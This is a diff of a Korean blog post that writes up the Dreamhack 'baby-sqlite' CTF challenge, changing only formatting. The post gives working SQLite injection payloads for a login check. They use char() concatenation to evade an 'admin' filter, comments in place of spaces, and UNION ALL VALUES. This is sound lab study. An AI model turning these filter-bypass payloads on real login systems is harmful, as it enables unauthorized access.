@@ -22,12 +22,12 @@ categories: "Dreamhack"
 
 **Injection**
 
-- **[名]** - 주사
-  **[名]** - (상황, 사업 등의 개선을 위한 거액의) 자금 투입)
-  **[名]** - (액체의) 주입
+- **[名]** - 주사  
+  **[名]** - (상황, 사업 등의 개선을 위한 거액의) 자금 투입)  
+  **[名]** - (액체의) 주입  
   **<動> injection**
 
-[example](https://www.threads.net/@slamslam__/post/C-mSaVcvuXD)
+[예시](https://www.threads.net/@slamslam__/post/C-mSaVcvuXD)
 
 이 게시글은 일종의 프롬포트 인젝션이라고 볼 수 있다. SQL Injection도 개념은 동일하다.
 
@@ -67,7 +67,7 @@ categories: "Dreamhack"
 
 > 경고! : 이 부분부터 풀이과정이 기술되어 있으니 혹시라도 문제를 풀어보려고 하는 분들은 여기서 멈추시고 풀고나서 다시 보시길 권장 드립니다.
 
-![problem_web_login]({{site.url}}/assets/img/posts_img/dh_baby_sqlite1.png)
+![problem_web_login]({{site.url}}/assets/img/posts_img/dh_baby_sqlite_1.png)
 
 이 문제의 로그인 화면이다. 하지만 이것만 보고는 취약점을 알 수 없으니 같이 제공해준 소스를 살펴보도록 하자.
 
@@ -152,20 +152,20 @@ sqli_filter 리스트에 있는 문자열들이 각 매개변수에 존재하는
 
 그다음으로 걸렸던 부분이 바로 admin이라는 글자도 필터링이 된다는 것이었다.
 
-그래서 글자하나하나를 일일이 넣고 문자열을 붙히는(concat) 방법을 생각했는데 다른 프로그래밍 언어와는 다르게 + 기호로는 연결이 되지 않아 고민했는데 검색을 통해 + 대신 || 로 바꿔서 쓰면 사용이 가능하다는 것을 확인했다. 그래서 admin이라는 글자를 char()이라는 함수로 아스키 코드 숫자를 넣어서 아래와 같이 만들었다.
+그래서 글자하나하나를 일일이 넣고 문자열을 붙히는(concat) 방법을 생각했는데 다른 프로그래밍 언어와는 다르게 + 기호로는 연결이 되지 않아 고민했는데 검색을 통해 + 대신 \|\| 로 바꿔서 쓰면 사용이 가능하다는 것을 확인했다. 그래서 admin이라는 글자를 char()이라는 함수로 아스키 코드 숫자를 넣어서 아래와 같이 만들었다.
 
-> **char(97)||char(100)||char(109)||char(105)||char(110))**
+> **char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110))**
 
 이를 바탕으로 아래와 같이 매개변수에 넣어서 기존계정을 admin계정으로 변조하는 쿼리문을 만들어내었다.
 
-> uid=
-> upw=
-> level=1;update/**/users/**/set/**/uid=(char(97)||char(100)||char(109)||char(105)||char(110))
-> **Query : SELECT uid FROM users WHERE uid='' and upw='' and level=1;update//users//set/**/uid=(char(97)||char(100)||char(109)||char(105)||char(110));**
+> uid=  
+> upw=  
+> level=1;update/**/users/**/set/**/uid=(char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110))  
+> **Query : SELECT uid FROM users WHERE uid='' and upw='' and level=1;update//users//set/**/uid=(char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110));**
 
 쿼리가 잘 동작하는 것까지 테스트 하고 문제 사이트에 웹 요청을 보냈는데…
 
-![result1]({{site.url}}/assets/img/posts_img/dh_baby_sqlite2.png)
+![result1]({{site.url}}/assets/img/posts_img/dh_baby_sqlite_2.png)
 
 … 에러가 발생했다.
 
@@ -194,16 +194,16 @@ where의 추가 조건을 더 넣는다고 해도 이미 있는 SELECT문 만으
 
 그래서 공식문서만 몇번을 읽다가 지쳐있던 와중에 눈에 들어온 함수가 있었다.
 
-![sqlite_document]({{site.url}}/assets/img/posts_img/dh_baby_sqlite3.png)
+![sqlite_document]({{site.url}}/assets/img/posts_img/dh_baby_sqlite_3.png)
 
 (편의상 번역기로 번역하였음.)
 
 이 Values 함수가 Select ~~ UNION ALL ~~ 과 동일한 역할을 할 수 있다는 내용을 확인하고 곧장 다시 아래와 같이 쿼리문을 작성하였다.
 
-> uid=dream
-> upw=cometrue
-> level=9/**/union/**/all/**/values((char(97)||char(100)||char(109)||char(105)||char(110)))
-> **Query : SELECT uid FROM users WHERE uid='dream' and upw='cometrue' and level=9/**/union/**/all/**/values((char(97)||char(100)||char(109)||char(105)||char(110)));**
+> uid=dream  
+> upw=cometrue  
+> level=9/**/union/**/all/**/values((char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110)))  
+> **Query : SELECT uid FROM users WHERE uid='dream' and upw='cometrue' and level=9/**/union/**/all/**/values((char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110)));**
 
 테스트 결과 dream계정과 admin 계정이 동시에 담긴 테이블이 반환되는 것을 확인했다.
 
@@ -216,12 +216,12 @@ ORDER BY 명령으로 정렬을 할가 고민했으나 VALUES 함수 뒤에 ORDE
 
 그래서 최종적으로 이렇게 매개변수를 작성하여 제출하였다.
 
-> uid=
-> upw=
-> level=9/**/union/**/all/**/values((char(97)||char(100)||char(109)||char(105)||char(110)))
-> **Query : SELECT uid FROM users WHERE uid='' and upw='' and level=9/**/union/**/all/**/values((char(97)||char(100)||char(109)||char(105)||char(110)));**
+> uid=  
+> upw=  
+> level=9/**/union/**/all/**/values((char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110)))  
+> **Query : SELECT uid FROM users WHERE uid='' and upw='' and level=9/**/union/**/all/**/values((char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110)));**
 
-![result2]({{site.url}}/assets/img/posts_img/dh_baby_sqlite4.png)
+![result2]({{site.url}}/assets/img/posts_img/dh_baby_sqlite_4.png)
 
 드디어 FLAG를 획득했다…
 
@@ -231,5 +231,5 @@ ORDER BY 명령으로 정렬을 할가 고민했으나 VALUES 함수 뒤에 ORDE
 
 1. **파이썬의 sqlite3 라이브러리에서 execute함수는 오직 한개의 쿼리만 수행할 수 있다.**
 2. **SQL Injection은 꼭 테이블을 위조, 조작하는 것 뿐만아니라 단순히 의도치 않는 출력을 만들어 내는 것 또한 포함된다.**
-3. **공백을 범위 주석(/**/)으로 대체하는게 가능하다 (… 이건 아직도 신기하다)\*\*
+3. **공백을 범위 주석(/\*\*/)으로 대체하는게 가능하다 (… 이건 아직도 신기하다)**
 4. **SQL 인젝션을 단순 필터로 막기에는 상대적으로 힘들다. 서비스를 만들때 이미 어느정도의 보안 솔루션이 갖춰져 있는 ORM이나 다른 라이브러리등을 생각해보는게 그나마 쉬워보인다…**
